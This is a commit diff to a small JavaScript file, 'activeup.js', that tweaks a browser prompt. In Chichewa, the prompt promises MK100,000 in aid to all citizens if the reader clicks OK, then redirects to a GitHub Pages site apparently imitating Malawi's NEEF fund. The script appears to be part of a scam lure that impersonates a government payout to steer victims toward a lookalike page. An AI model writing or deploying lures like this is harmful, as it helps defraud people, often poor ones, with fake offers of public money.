3cc91434e98605dcaf555da6de1a5bbc8d44b696
offernoww <josiahnyeti16@gmail.com>
2025-01-10 00:34:47 +0100

    Update activeup.js

--- activeup.js
+++ activeup.js
@@ -1,6 +1,6 @@
 
 var password = 'MK100,000'
-password=prompt('SMS :Pezani thandizo la MK100,000 tsopano kwa nzika zonse, dinani OK kuti mupeze yanu  ','Mk100,000');
+password=prompt('SMS :Pezani thandizo la MK100,000 tsopano kwa nzika zonse, dinani OK kuti mupeze yanu  ','MK100,000');
 if (password != 'MK100,000') {
 location.href='https://offernoww.github.io/NEEF-malawi';
 }
